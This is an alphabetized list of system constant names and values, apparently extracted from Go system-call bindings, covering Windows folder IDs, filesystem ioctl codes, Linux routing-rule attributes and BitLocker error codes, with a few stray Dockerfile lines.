FLUSHO                        = 0x2000
FLUSHR                        = 0x1
FLUSHRW                       = 0x3
FLUSHW                        = 0x2
FNDELAY                         = 0x04
FOLDERID_AccountPictures        = 
FOLDERID_AddNewPrograms         = 
FOLDERID_AdminTools             = 
FOLDERID_AllAppMods             = 
FOLDERID_AppCaptures            = 
FOLDERID_AppDataDesktop         = 
FOLDERID_AppDataDocuments       = 
FOLDERID_AppDataFavorites       = 
FOLDERID_AppDataProgramData     = 
FOLDERID_AppUpdates             = 
FOLDERID_ApplicationShortcuts   = 
FOLDERID_AppsFolder             = 
FOLDERID_CDBurning              = 
FOLDERID_CameraRoll             = 
FOLDERID_CameraRollLibrary      = 
FOLDERID_ChangeRemovePrograms   = 
FOLDERID_CommonAdminTools       = 
FOLDERID_CommonOEMLinks         = 
FOLDERID_CommonPrograms         = 
FOLDERID_CommonStartMenu        = 
FOLDERID_CommonStartMenuPlaces  = 
FOLDERID_CommonStartup          = 
FOLDERID_CommonTemplates        = 
FOLDERID_ComputerFolder         = 
FOLDERID_ConflictFolder         = 
FOLDERID_ConnectionsFolder      = 
FOLDERID_Contacts               = 
FOLDERID_ControlPanelFolder     = 
FOLDERID_Cookies                = 
FOLDERID_CurrentAppMods         = 
FOLDERID_Desktop                = 
FOLDERID_DevelopmentFiles       = 
FOLDERID_Device                 = 
FOLDERID_DeviceMetadataStore    = 
FOLDERID_Documents              = 
FOLDERID_DocumentsLibrary       = 
FOLDERID_Downloads              = 
FOLDERID_Favorites              = 
FOLDERID_Fonts                  = 
FOLDERID_GameTasks              = 
FOLDERID_Games                  = 
FOLDERID_History                = 
FOLDERID_HomeGroup              = 
FOLDERID_HomeGroupCurrentUser   = 
FOLDERID_ImplicitAppShortcuts   = 
FOLDERID_InternetCache          = 
FOLDERID_InternetFolder         = 
FOLDERID_Libraries              = 
FOLDERID_Links                  = 
FOLDERID_LocalAppData           = 
FOLDERID_LocalAppDataLow        = 
FOLDERID_LocalDocuments         = 
FOLDERID_LocalDownloads         = 
FOLDERID_LocalMusic             = 
FOLDERID_LocalPictures          = 
FOLDERID_LocalVideos            = 
FOLDERID_LocalizedResourcesDir  = 
FOLDERID_Music                  = 
FOLDERID_MusicLibrary           = 
FOLDERID_NetHood                = 
FOLDERID_NetworkFolder          = 
FOLDERID_Objects3D              = 
FOLDERID_OneDrive               = 
FOLDERID_OriginalImages         = 
FOLDERID_PhotoAlbums            = 
FOLDERID_Pictures               = 
FOLDERID_PicturesLibrary        = 
FOLDERID_Playlists              = 
FOLDERID_PrintHood              = 
FOLDERID_PrintersFolder         = 
FOLDERID_Profile                = 
FOLDERID_ProgramData            = 
FOLDERID_ProgramFiles           = 
FOLDERID_ProgramFilesCommon     = 
FOLDERID_ProgramFilesCommonX64  = 
FOLDERID_ProgramFilesCommonX86  = 
FOLDERID_ProgramFilesX64        = 
FOLDERID_ProgramFilesX86        = 
FOLDERID_Programs               = 
FOLDERID_Public                 = 
FOLDERID_PublicDesktop          = 
FOLDERID_PublicDocuments        = 
FOLDERID_PublicDownloads        = 
FOLDERID_PublicGameTasks        = 
FOLDERID_PublicLibraries        = 
FOLDERID_PublicMusic            = 
FOLDERID_PublicPictures         = 
FOLDERID_PublicRingtones        = 
FOLDERID_PublicUserTiles        = 
FOLDERID_PublicVideos           = 
FOLDERID_QuickLaunch            = 
FOLDERID_Recent                 = 
FOLDERID_RecordedCalls          = 
FOLDERID_RecordedTVLibrary      = 
FOLDERID_RecycleBinFolder       = 
FOLDERID_ResourceDir            = 
FOLDERID_RetailDemo             = 
FOLDERID_Ringtones              = 
FOLDERID_RoamedTileImages       = 
FOLDERID_RoamingAppData         = 
FOLDERID_RoamingTiles           = 
FOLDERID_SEARCH_CSC             = 
FOLDERID_SEARCH_MAPI            = 
FOLDERID_SampleMusic            = 
FOLDERID_SamplePictures         = 
FOLDERID_SamplePlaylists        = 
FOLDERID_SampleVideos           = 
FOLDERID_SavedGames             = 
FOLDERID_SavedPictures          = 
FOLDERID_SavedPicturesLibrary   = 
FOLDERID_SavedSearches          = 
FOLDERID_Screenshots            = 
FOLDERID_SearchHistory          = 
FOLDERID_SearchHome             = 
FOLDERID_SearchTemplates        = 
FOLDERID_SendTo                 = 
FOLDERID_SidebarDefaultParts    = 
FOLDERID_SidebarParts           = 
FOLDERID_SkyDrive               = 
FOLDERID_SkyDriveCameraRoll     = 
FOLDERID_SkyDriveDocuments      = 
FOLDERID_SkyDriveMusic          = 
FOLDERID_SkyDrivePictures       = 
FOLDERID_StartMenu              = 
FOLDERID_StartMenuAllPrograms   = 
FOLDERID_Startup                = 
FOLDERID_SyncManagerFolder      = 
FOLDERID_SyncResultsFolder      = 
FOLDERID_SyncSetupFolder        = 
FOLDERID_System                 = 
FOLDERID_SystemX86              = 
FOLDERID_Templates              = 
FOLDERID_UserPinned             = 
FOLDERID_UserProfiles           = 
FOLDERID_UserProgramFiles       = 
FOLDERID_UserProgramFilesCommon = 
FOLDERID_UsersFiles             = 
FOLDERID_UsersLibraries         = 
FOLDERID_Videos                 = 
FOLDERID_VideosLibrary          = 
FOLDERID_Windows                = 
FOLLOW
FORMAT_MESSAGE_ALLOCATE_BUFFER = 256
FORMAT_MESSAGE_ARGUMENT_ARRAY  = 8192
FORMAT_MESSAGE_FROM_HMODULE
FORMAT_MESSAGE_FROM_HMODULE    = 2048
FORMAT_MESSAGE_FROM_STRING     = 1024
FORMAT_MESSAGE_FROM_SYSTEM     = 4096
FORMAT_MESSAGE_IGNORE_INSERTS  = 512
FORMAT_MESSAGE_MAX_WIDTH_MASK  = 255
FPSIMD_MAGIC                     = 0x46508001
FPU_CTX_MAGIC                    = 0x46505501
FP_XSTATE_MAGIC2                 = 0x46505845
FParseErrWhitelist FParseErrWhitelist
FRA_DPORT_RANGE        = 0x18
FRA_DST                = 0x1
FRA_FLOW               = 0xb
FRA_FWMARK             = 0xa
FRA_FWMASK             = 0x10
FRA_GOTO               = 0x4
FRA_IIFNAME            = 0x3
FRA_IP_PROTO           = 0x16
FRA_L3MDEV             = 0x13
FRA_OIFNAME            = 0x11
FRA_PAD                = 0x12
FRA_PRIORITY           = 0x6
FRA_PROTOCOL           = 0x15
FRA_SPORT_RANGE        = 0x17
FRA_SRC                = 0x2
FRA_SUPPRESS_IFGROUP   = 0xd
FRA_SUPPRESS_PREFIXLEN = 0xe
FRA_TABLE              = 0xf
FRA_TUN_ID             = 0xc
FRA_UID_RANGE          = 0x14
FRA_UNSPEC             = 0x0
FRA_UNUSED2            = 0x5
FRA_UNUSED3            = 0x7
FRA_UNUSED4            = 0x8
FRA_UNUSED5            = 0x9
FROM golang:${GOVERSION}
FROM golang:1.13
FROM scratch
FRS_ERR_AUTHENTICATION                                                    syscall.Errno = 8008
FRS_ERR_CHILD_TO_PARENT_COMM                                              syscall.Errno = 8011
FRS_ERR_INSUFFICIENT_PRIV                                                 syscall.Errno = 8007
FRS_ERR_INTERNAL                                                          syscall.Errno = 8005
FRS_ERR_INTERNAL_API                                                      syscall.Errno = 8004
FRS_ERR_INVALID_API_SEQUENCE                                              syscall.Errno = 8001
FRS_ERR_INVALID_SERVICE_PARAMETER                                         syscall.Errno = 8017
FRS_ERR_PARENT_AUTHENTICATION                                             syscall.Errno = 8010
FRS_ERR_PARENT_INSUFFICIENT_PRIV                                          syscall.Errno = 8009
FRS_ERR_PARENT_TO_CHILD_COMM                                              syscall.Errno = 8012
FRS_ERR_SERVICE_COMM                                                      syscall.Errno = 8006
FRS_ERR_STARTING_SERVICE                                                  syscall.Errno = 8002
FRS_ERR_STOPPING_SERVICE                                                  syscall.Errno = 8003
FRS_ERR_SYSVOL_DEMOTE                                                     syscall.Errno = 8016
FRS_ERR_SYSVOL_IS_BUSY                                                    syscall.Errno = 8015
FRS_ERR_SYSVOL_POPULATE                                                   syscall.Errno = 8013
FRS_ERR_SYSVOL_POPULATE_TIMEOUT                                           syscall.Errno = 8014
FR_ACT_BLACKHOLE       = 0x6
FR_ACT_GOTO            = 0x2
FR_ACT_NOP             = 0x3
FR_ACT_PROHIBIT        = 0x8
FR_ACT_RES3            = 0x4
FR_ACT_RES4            = 0x5
FR_ACT_TO_TBL          = 0x1
FR_ACT_UNREACHABLE     = 0x7
FR_ACT_UNSPEC          = 0x0
FSCRYPT_/ 
FSCRYPT_KEY_DESCRIPTOR_SIZE                 = 0x8
FSCRYPT_KEY_DESC_PREFIX_SIZE                = 0x8
FSCRYPT_KEY_IDENTIFIER_SIZE                 = 0x10
FSCRYPT_KEY_REMOVAL_STATUS_FLAG_FILES_BUSY  = 0x1
FSCRYPT_KEY_REMOVAL_STATUS_FLAG_OTHER_USERS = 0x2
FSCRYPT_KEY_SPEC_TYPE_DESCRIPTOR            = 0x1
FSCRYPT_KEY_SPEC_TYPE_IDENTIFIER            = 0x2
FSCRYPT_KEY_STATUS_ABSENT                   = 0x1
FSCRYPT_KEY_STATUS_FLAG_ADDED_BY_SELF       = 0x1
FSCRYPT_KEY_STATUS_INCOMPLETELY_REMOVED     = 0x3
FSCRYPT_KEY_STATUS_PRESENT                  = 0x2
FSCRYPT_MAX_KEY_SIZE                        = 0x40
FSCRYPT_MODE_ADIANTUM                       = 0x9
FSCRYPT_MODE_AES_128_CBC                    = 0x5
FSCRYPT_MODE_AES_128_CTS                    = 0x6
FSCRYPT_MODE_AES_256_CTS                    = 0x4
FSCRYPT_MODE_AES_256_XTS                    = 0x1
FSCRYPT_POLICY_FLAGS_PAD_16                 = 0x2
FSCRYPT_POLICY_FLAGS_PAD_32                 = 0x3
FSCRYPT_POLICY_FLAGS_PAD_4                  = 0x0
FSCRYPT_POLICY_FLAGS_PAD_8                  = 0x1
FSCRYPT_POLICY_FLAGS_PAD_MASK               = 0x3
FSCRYPT_POLICY_FLAG_DIRECT_KEY              = 0x4
FSCRYPT_POLICY_FLAG_IV_INO_LBLK_32          = 0x10
FSCRYPT_POLICY_FLAG_IV_INO_LBLK_64          = 0x8
FSCRYPT_POLICY_V1                           = 0x0
FSCRYPT_POLICY_V2                           = 0x2
FSCTL_CREATE_OR_GET_OBJECT_ID             = 0x0900C0
FSCTL_DELETE_OBJECT_ID                    = 0x0900A0
FSCTL_DELETE_REPARSE_POINT                = 0x0900AC
FSCTL_DUPLICATE_EXTENTS_TO_FILE           = 0x098344
FSCTL_DUPLICATE_EXTENTS_TO_FILE_EX        = 0x0983E8
FSCTL_FILESYSTEM_GET_STATISTICS           = 0x090060
FSCTL_FILE_LEVEL_TRIM                     = 0x098208
FSCTL_FIND_FILES_BY_SID                   = 0x09008F
FSCTL_GET_COMPRESSION                     = 0x09003C
FSCTL_GET_INTEGRITY_INFORMATION           = 0x09027C
FSCTL_GET_NTFS_VOLUME_DATA                = 0x090064
FSCTL_GET_OBJECT_ID                       = 0x09009C
FSCTL_GET_REFS_VOLUME_DATA                = 0x0902D8
FSCTL_GET_REPARSE_POINT                   = 0x0900A8
FSCTL_GET_RETRIEVAL_POINTERS              = 0x090073
FSCTL_GET_RETRIEVAL_POINTERS_AND_REFCOUNT = 0x0903D3
FSCTL_GET_RETRIEVAL_POINTER_COUNT         = 0x09042B
FSCTL_IS_PATHNAME_VALID                   = 0x09002C
FSCTL_LMR_SET_LINK_TRACKING_INFORMATION   = 0x1400EC
FSCTL_MARK_HANDLE                         = 0x0900FC
FSCTL_OFFLOAD_READ                        = 0x094264
FSCTL_OFFLOAD_WRITE                       = 0x098268
FSCTL_PIPE_PEEK                           = 0x11400C
FSCTL_PIPE_TRANSCEIVE                     = 0x11C017
FSCTL_PIPE_WAIT                           = 0x110018
FSCTL_QUERY_ALLOCATED_RANGES              = 0x0940CF
FSCTL_QUERY_FAT_BPB                       = 0x090058
FSCTL_QUERY_FILE_REGIONS                  = 0x090284
FSCTL_QUERY_ON_DISK_VOLUME_INFO           = 0x09013C
FSCTL_QUERY_SPARING_INFO                  = 0x090138
FSCTL_READ_FILE_USN_DATA                  = 0x0900EB
FSCTL_RECALL_FILE                         = 0x090117
FSCTL_REFS_STREAM_SNAPSHOT_MANAGEMENT     = 0x090440
FSCTL_SET_COMPRESSION                     = 0x09C040
FSCTL_SET_DEFECT_MANAGEMENT               = 0x098134
FSCTL_SET_ENCRYPTION                      = 0x0900D7
FSCTL_SET_INTEGRITY_INFORMATION           = 0x09C280
FSCTL_SET_INTEGRITY_INFORMATION_EX        = 0x090380
FSCTL_SET_OBJECT_ID                       = 0x090098
FSCTL_SET_OBJECT_ID_EXTENDED              = 0x0900BC
FSCTL_SET_REPARSE_POINT                   = 0x0900A4
FSCTL_SET_SPARSE                          = 0x0900C4
FSCTL_SET_ZERO_DATA                       = 0x0980C8
FSCTL_SET_ZERO_ON_DEALLOCATION            = 0x090194
FSCTL_SIS_COPYFILE                        = 0x090100
FSCTL_WRITE_USN_CLOSE_RECORD              = 0x0900EF
FSIZE
FSMOUNT_CLOEXEC = 0x1
FSOPEN_CLOEXEC = 0x1
FSOPT_/ 
FSOPT_ATTR_CMN_EXTENDED                 = 0x20
FSOPT_NOFOLLOW                          = 0x1
FSOPT_NOINMEMUPDATE                     = 0x2
FSOPT_PACK_INVAL_ATTRS                  = 0x8
FSOPT_REPORT_FULLSIZE                   = 0x4
FSOPT_RETURN_REALDEV                    = 0x200
FSPICK_CLOEXEC          = 0x1
FSPICK_EMPTY_PATH       = 0x8
FSPICK_NO_AUTOMOUNT     = 0x4
FSPICK_SYMLINK_NOFOLLOW = 0x2
FS_(POLICY_FLAGS
FS_ENCRYPTION_MODE_ADIANTUM                 = 0x9
FS_ENCRYPTION_MODE_AES_128_CBC              = 0x5
FS_ENCRYPTION_MODE_AES_128_CTS              = 0x6
FS_ENCRYPTION_MODE_AES_256_CBC              = 0x3
FS_ENCRYPTION_MODE_AES_256_CTS              = 0x4
FS_ENCRYPTION_MODE_AES_256_GCM              = 0x2
FS_ENCRYPTION_MODE_AES_256_XTS              = 0x1
FS_ENCRYPTION_MODE_INVALID                  = 0x0
FS_ENCRYPTION_MODE_SPECK128_256_CTS         = 0x8
FS_ENCRYPTION_MODE_SPECK128_256_XTS         = 0x7
FS_IOC_.
FS_IOC_ADD_ENCRYPTION_KEY                   = 0xc0506617
FS_IOC_ENABLE_VERITY             = 0x40806685
FS_IOC_ENABLE_VERITY             = 0x80806685
FS_IOC_GETFLAGS                  = 0x40046601
FS_IOC_GETFLAGS                  = 0x40086601
FS_IOC_GETFLAGS                  = 0x80046601
FS_IOC_GETFLAGS                  = 0x80086601
FS_IOC_GET_ENCRYPTION_KEY_STATUS            = 0xc080661a
FS_IOC_GET_ENCRYPTION_NONCE      = 0x4010661b
FS_IOC_GET_ENCRYPTION_NONCE      = 0x8010661b
FS_IOC_GET_ENCRYPTION_POLICY     = 0x400c6615
FS_IOC_GET_ENCRYPTION_POLICY     = 0x800c6615
FS_IOC_GET_ENCRYPTION_POLICY_EX             = 0xc0096616
FS_IOC_GET_ENCRYPTION_PWSALT     = 0x40106614
FS_IOC_GET_ENCRYPTION_PWSALT     = 0x80106614
FS_IOC_MEASURE_VERITY                       = 0xc0046686
FS_IOC_READ_VERITY_METADATA                 = 0xc0286687
FS_IOC_REMOVE_ENCRYPTION_KEY                = 0xc0406618
FS_IOC_REMOVE_ENCRYPTION_KEY_ALL_USERS      = 0xc0406619
FS_IOC_SETFLAGS                  = 0x40046602
FS_IOC_SETFLAGS                  = 0x40086602
FS_IOC_SETFLAGS                  = 0x80046602
FS_IOC_SETFLAGS                  = 0x80086602
FS_IOC_SET_ENCRYPTION_POLICY     = 0x400c6613
FS_IOC_SET_ENCRYPTION_POLICY     = 0x800c6613
FS_KEY_DESCRIPTOR_SIZE                      = 0x8
FS_KEY_DESC_PREFIX_SIZE                     = 0x8
FS_MAX_KEY_SIZE                             = 0x40
FS_POLICY_FLAGS_PAD_16                      = 0x2
FS_POLICY_FLAGS_PAD_32                      = 0x3
FS_POLICY_FLAGS_PAD_4                       = 0x0
FS_POLICY_FLAGS_PAD_8                       = 0x1
FS_POLICY_FLAGS_PAD_MASK                    = 0x3
FS_POLICY_FLAGS_VALID                       = 0x7
FS_VERITY_/ 
FS_VERITY_FL                                = 0x100000
FS_VERITY_HASH_ALG_SHA256                   = 0x1
FS_VERITY_HASH_ALG_SHA512                   = 0x2
FS_VERITY_METADATA_TYPE_DESCRIPTOR          = 0x2
FS_VERITY_METADATA_TYPE_MERKLE_TREE         = 0x1
FS_VERITY_METADATA_TYPE_SIGNATURE           = 0x3
FUSE_SUPER_MAGIC                            = 0x65735546
FUTEXFS_SUPER_MAGIC                         = 0xbad1dea
FVE_E_ACTION_NOT_ALLOWED                                                  Handle        = 0x80310009
FVE_E_ADBACKUP_NOT_ENABLED                                                Handle        = 0x803100D5
FVE_E_AD_ATTR_NOT_SET                                                     Handle        = 0x8031000E
FVE_E_AD_BACKUP_REQUIRED_POLICY_NOT_SET_FIXED_DRIVE                       Handle        = 0x803100DB
FVE_E_AD_BACKUP_REQUIRED_POLICY_NOT_SET_OS_DRIVE                          Handle        = 0x803100DA
FVE_E_AD_BACKUP_REQUIRED_POLICY_NOT_SET_REMOVABLE_DRIVE                   Handle        = 0x803100DC
FVE_E_AD_GUID_NOT_FOUND                                                   Handle        = 0x8031000F
FVE_E_AD_INSUFFICIENT_BUFFER                                              Handle        = 0x8031001A
FVE_E_AD_INVALID_DATASIZE                                                 Handle        = 0x8031000C
FVE_E_AD_INVALID_DATATYPE                                                 Handle        = 0x8031000B
FVE_E_AD_NO_VALUES                                                        Handle        = 0x8031000D
FVE_E_AD_SCHEMA_NOT_INSTALLED                                             Handle        = 0x8031000A
FVE_E_AUTH_INVALID_APPLICATION                                            Handle        = 0x80310044
FVE_E_AUTH_INVALID_CONFIG                                                 Handle        = 0x80310045
FVE_E_AUTOUNLOCK_ENABLED                                                  Handle        = 0x80310029
FVE_E_BAD_DATA                                                            Handle        = 0x80310016
FVE_E_BAD_INFORMATION                                                     Handle        = 0x80310010
FVE_E_BAD_PARTITION_SIZE                                                  Handle        = 0x80310014
FVE_E_BCD_APPLICATIONS_PATH_INCORRECT                                     Handle        = 0x80310052
FVE_E_BOOTABLE_CDDVD                                                      Handle        = 0x80310030
FVE_E_BUFFER_TOO_LARGE                                                    Handle        = 0x803100CF
FVE_E_CANNOT_ENCRYPT_NO_KEY                                               Handle        = 0x8031002E
FVE_E_CANNOT_SET_FVEK_ENCRYPTED                                           Handle        = 0x8031002D
FVE_E_CANT_LOCK_AUTOUNLOCK_ENABLED_VOLUME                                 Handle        = 0x80310097
FVE_E_CLUSTERING_NOT_SUPPORTED                                            Handle        = 0x8031001E
FVE_E_CONV_READ                                                           Handle        = 0x8031001B
FVE_E_CONV_RECOVERY_FAILED                                                Handle        = 0x80310088
FVE_E_CONV_WRITE                                                          Handle        = 0x8031001C
FVE_E_DEBUGGER_ENABLED                                                    Handle        = 0x8031004F
FVE_E_DEVICELOCKOUT_COUNTER_MISMATCH                                      Handle        = 0x803100CE
FVE_E_DEVICE_LOCKOUT_COUNTER_UNAVAILABLE                                  Handle        = 0x803100CD
FVE_E_DEVICE_NOT_JOINED                                                   Handle        = 0x803100E0
FVE_E_DE_DEVICE_LOCKEDOUT                                                 Handle        = 0x803100CA
FVE_E_DE_FIXED_DATA_NOT_SUPPORTED                                         Handle        = 0x803100C5
FVE_E_DE_HARDWARE_NOT_COMPLIANT                                           Handle        = 0x803100C6
FVE_E_DE_OS_VOLUME_NOT_PROTECTED                                          Handle        = 0x803100C9
FVE_E_DE_PREVENTED_FOR_OS                                                 Handle        = 0x803100D1
FVE_E_DE_PROTECTION_NOT_YET_ENABLED                                       Handle        = 0x803100CB
FVE_E_DE_PROTECTION_SUSPENDED                                             Handle        = 0x803100C8
FVE_E_DE_VOLUME_NOT_SUPPORTED                                             Handle        = 0x803100D3
FVE_E_DE_VOLUME_OPTED_OUT                                                 Handle        = 0x803100D2
FVE_E_DE_WINRE_NOT_CONFIGURED                                             Handle        = 0x803100C7
FVE_E_DRY_RUN_FAILED                                                      Handle        = 0x8031004D
FVE_E_DV_NOT_ALLOWED_BY_GP                                                Handle        = 0x80310071
FVE_E_DV_NOT_SUPPORTED_ON_FS                                              Handle        = 0x80310070
FVE_E_EDRIVE_BAND_IN_USE                                                  Handle        = 0x803100B0
FVE_E_EDRIVE_DISALLOWED_BY_GP                                             Handle        = 0x803100B1
FVE_E_EDRIVE_DRY_RUN_FAILED                                               Handle        = 0x803100BC
FVE_E_EDRIVE_DV_NOT_SUPPORTED                                             Handle        = 0x803100B4
FVE_E_EDRIVE_INCOMPATIBLE_FIRMWARE                                        Handle        = 0x803100BF
FVE_E_EDRIVE_INCOMPATIBLE_VOLUME                                          Handle        = 0x803100B2
FVE_E_EDRIVE_NO_FAILOVER_TO_SW                                            Handle        = 0x803100AF
FVE_E_EFI_ONLY                                                            Handle        = 0x8031009C
FVE_E_ENH_PIN_INVALID                                                     Handle        = 0x80310099
FVE_E_EOW_NOT_SUPPORTED_IN_VERSION                                        Handle        = 0x803100D4
FVE_E_EXECUTE_REQUEST_SENT_TOO_SOON                                       Handle        = 0x803100DE
FVE_E_FAILED_AUTHENTICATION                                               Handle        = 0x80310027
FVE_E_FAILED_SECTOR_SIZE                                                  Handle        = 0x80310026
FVE_E_FAILED_WRONG_FS                                                     Handle        = 0x80310013
FVE_E_FIPS_DISABLE_PROTECTION_NOT_ALLOWED                                 Handle        = 0x80310046
FVE_E_FIPS_HASH_KDF_NOT_ALLOWED                                           Handle        = 0x80310098
FVE_E_FIPS_PREVENTS_EXTERNAL_KEY_EXPORT                                   Handle        = 0x80310038
FVE_E_FIPS_PREVENTS_PASSPHRASE                                            Handle        = 0x8031006C
FVE_E_FIPS_PREVENTS_RECOVERY_PASSWORD                                     Handle        = 0x80310037
FVE_E_FIPS_RNG_CHECK_FAILED                                               Handle        = 0x80310036
FVE_E_FIRMWARE_TYPE_NOT_SUPPORTED                                         Handle        = 0x80310048
FVE_E_FOREIGN_VOLUME                                                      Handle        = 0x80310023
FVE_E_FS_MOUNTED                                                          Handle        = 0x8031004B
FVE_E_FS_NOT_EXTENDED                                                     Handle        = 0x80310047
FVE_E_FULL_ENCRYPTION_NOT_ALLOWED_ON_TP_STORAGE                           Handle        = 0x803100A5
FVE_E_HIDDEN_VOLUME                                                       Handle        = 0x80310056
FVE_E_INVALID_BITLOCKER_OID                                               Handle        = 0x8031006E
FVE_E_INVALID_DATUM_TYPE                                                  Handle        = 0x8031009B
FVE_E_INVALID_KEY_FORMAT                                                  Handle        = 0x80310034
FVE_E_INVALID_NKP_CERT                                                    Handle        = 0x8031009F
FVE_E_INVALID_PASSWORD_FORMAT                                             Handle        = 0x80310035
FVE_E_INVALID_PIN_CHARS                                                   Handle        = 0x8031009A
FVE_E_INVALID_PIN_CHARS_DETAILED                                          Handle        = 0x803100CC
FVE_E_INVALID_PROTECTOR_TYPE                                              Handle        = 0x8031003A
FVE_E_INVALID_STARTUP_OPTIONS                                             Handle        = 0x8031005B
FVE_E_KEYFILE_INVALID                                                     Handle        = 0x8031003D
FVE_E_KEYFILE_NOT_FOUND                                                   Handle        = 0x8031003C
FVE_E_KEYFILE_NO_VMK                                                      Handle        = 0x8031003E
FVE_E_KEY_LENGTH_NOT_SUPPORTED_BY_EDRIVE                                  Handle        = 0x803100A7
FVE_E_KEY_PROTECTOR_NOT_SUPPORTED                                         Handle        = 0x80310069
FVE_E_KEY_REQUIRED                                                        Handle        = 0x8031001D
FVE_E_KEY_ROTATION_NOT_ENABLED                                            Handle        = 0x803100DF
FVE_E_KEY_ROTATION_NOT_SUPPORTED                                          Handle        = 0x803100DD
FVE_E_LIVEID_ACCOUNT_BLOCKED                                              Handle        = 0x803100C3
FVE_E_LIVEID_ACCOUNT_SUSPENDED                                            Handle        = 0x803100C2
FVE_E_LOCKED_VOLUME                                                       Handle        = 0x80310000
FVE_E_MOR_FAILED                                                          Handle        = 0x80310055
FVE_E_MULTIPLE_NKP_CERTS                                                  Handle        = 0x8031009D
FVE_E_NON_BITLOCKER_KU                                                    Handle        = 0x80310093
FVE_E_NON_BITLOCKER_OID                                                   Handle        = 0x80310085
FVE_E_NOT_ACTIVATED                                                       Handle        = 0x80310008
FVE_E_NOT_ALLOWED_IN_SAFE_MODE                                            Handle        = 0x80310040
FVE_E_NOT_ALLOWED_IN_VERSION                                              Handle        = 0x80310053
FVE_E_NOT_ALLOWED_ON_CLUSTER                                              Handle        = 0x803100AE
FVE_E_NOT_ALLOWED_ON_CSV_STACK                                            Handle        = 0x803100AD
FVE_E_NOT_ALLOWED_TO_UPGRADE_WHILE_CONVERTING                             Handle        = 0x803100B3
FVE_E_NOT_DATA_VOLUME                                                     Handle        = 0x80310019
FVE_E_NOT_DECRYPTED                                                       Handle        = 0x80310039
FVE_E_NOT_DE_VOLUME                                                       Handle        = 0x803100D7
FVE_E_NOT_ENCRYPTED                                                       Handle        = 0x80310001
FVE_E_NOT_ON_STACK                                                        Handle        = 0x8031004A
FVE_E_NOT_OS_VOLUME                                                       Handle        = 0x80310028
FVE_E_NOT_PROVISIONED_ON_ALL_VOLUMES                                      Handle        = 0x803100C4
FVE_E_NOT_SUPPORTED                                                       Handle        = 0x80310015
FVE_E_NO_AUTOUNLOCK_MASTER_KEY                                            Handle        = 0x80310054
FVE_E_NO_BOOTMGR_METRIC                                                   Handle        = 0x80310005
FVE_E_NO_BOOTSECTOR_METRIC                                                Handle        = 0x80310004
FVE_E_NO_EXISTING_PASSPHRASE                                              Handle        = 0x803100A8
FVE_E_NO_EXISTING_PIN                                                     Handle        = 0x803100A0
FVE_E_NO_FEATURE_LICENSE                                                  Handle        = 0x8031005A
FVE_E_NO_LICENSE                                                          Handle        = 0x80310049
FVE_E_NO_MBR_METRIC                                                       Handle        = 0x80310003
FVE_E_NO_PASSPHRASE_WITH_TPM                                              Handle        = 0x803100AB
FVE_E_NO_PREBOOT_KEYBOARD_DETECTED                                        Handle        = 0x803100B5
FVE_E_NO_PREBOOT_KEYBOARD_OR_WINRE_DETECTED                               Handle        = 0x803100B6
FVE_E_NO_PROTECTORS_TO_TEST                                               Handle        = 0x8031003B
FVE_E_NO_SUCH_CAPABILITY_ON_TARGET                                        Handle        = 0x803100D0
FVE_E_NO_TPM_BIOS                                                         Handle        = 0x80310002
FVE_E_NO_TPM_WITH_PASSPHRASE                                              Handle        = 0x803100AC
FVE_E_OPERATION_NOT_SUPPORTED_ON_VISTA_VOLUME                             Handle        = 0x80310096
FVE_E_OSV_KSR_NOT_ALLOWED                                                 Handle        = 0x803100D9
FVE_E_OS_NOT_PROTECTED                                                    Handle        = 0x80310020
FVE_E_OS_VOLUME_PASSPHRASE_NOT_ALLOWED                                    Handle        = 0x8031006D
FVE_E_OVERLAPPED_UPDATE                                                   Handle        = 0x80310024
FVE_E_PASSPHRASE_PROTECTOR_CHANGE_BY_STD_USER_DISALLOWED                  Handle        = 0x803100C1
FVE_E_PASSPHRASE_TOO_LONG                                                 Handle        = 0x803100AA
FVE_E_PIN_INVALID                                                         Handle        = 0x80310043
FVE_E_PIN_PROTECTOR_CHANGE_BY_STD_USER_DISALLOWED                         Handle        = 0x803100A2
FVE_E_POLICY_CONFLICT_FDV_RK_OFF_AUK_ON                                   Handle        = 0x80310083
FVE_E_POLICY_CONFLICT_FDV_RP_OFF_ADB_ON                                   Handle        = 0x80310091
FVE_E_POLICY_CONFLICT_OSV_RP_OFF_ADB_ON                                   Handle        = 0x80310090
FVE_E_POLICY_CONFLICT_RDV_RK_OFF_AUK_ON                                   Handle        = 0x80310084
FVE_E_POLICY_CONFLICT_RDV_RP_OFF_ADB_ON                                   Handle        = 0x80310092
FVE_E_POLICY_CONFLICT_RO_AND_STARTUP_KEY_REQUIRED                         Handle        = 0x80310087
FVE_E_POLICY_INVALID_ENHANCED_BCD_SETTINGS                                Handle        = 0x803100BE
FVE_E_POLICY_INVALID_PASSPHRASE_LENGTH                                    Handle        = 0x80310080
FVE_E_POLICY_INVALID_PIN_LENGTH                                           Handle        = 0x80310068
FVE_E_POLICY_PASSPHRASE_NOT_ALLOWED                                       Handle        = 0x8031006A
FVE_E_POLICY_PASSPHRASE_REQUIRED                                          Handle        = 0x8031006B
FVE_E_POLICY_PASSPHRASE_REQUIRES_ASCII                                    Handle        = 0x803100A4
FVE_E_POLICY_PASSPHRASE_TOO_SIMPLE                                        Handle        = 0x80310081
FVE_E_POLICY_PASSWORD_REQUIRED                                            Handle        = 0x8031002C
FVE_E_POLICY_PROHIBITS_SELFSIGNED                                         Handle        = 0x80310086
FVE_E_POLICY_RECOVERY_KEY_NOT_ALLOWED                                     Handle        = 0x8031005E
FVE_E_POLICY_RECOVERY_KEY_REQUIRED                                        Handle        = 0x8031005F
FVE_E_POLICY_RECOVERY_PASSWORD_NOT_ALLOWED                                Handle        = 0x8031005C
FVE_E_POLICY_RECOVERY_PASSWORD_REQUIRED                                   Handle        = 0x8031005D
FVE_E_POLICY_REQUIRES_RECOVERY_PASSWORD_ON_TOUCH_DEVICE                   Handle        = 0x803100B8
FVE_E_POLICY_REQUIRES_STARTUP_PIN_ON_TOUCH_DEVICE                         Handle        = 0x803100B7
FVE_E_POLICY_STARTUP_KEY_NOT_ALLOWED                                      Handle        = 0x80310062
FVE_E_POLICY_STARTUP_KEY_REQUIRED                                         Handle        = 0x80310063
FVE_E_POLICY_STARTUP_PIN_KEY_NOT_ALLOWED                                  Handle        = 0x80310064
FVE_E_POLICY_STARTUP_PIN_KEY_REQUIRED                                     Handle        = 0x80310065
FVE_E_POLICY_STARTUP_PIN_NOT_ALLOWED                                      Handle        = 0x80310060
FVE_E_POLICY_STARTUP_PIN_REQUIRED                                         Handle        = 0x80310061
FVE_E_POLICY_STARTUP_TPM_NOT_ALLOWED                                      Handle        = 0x80310066
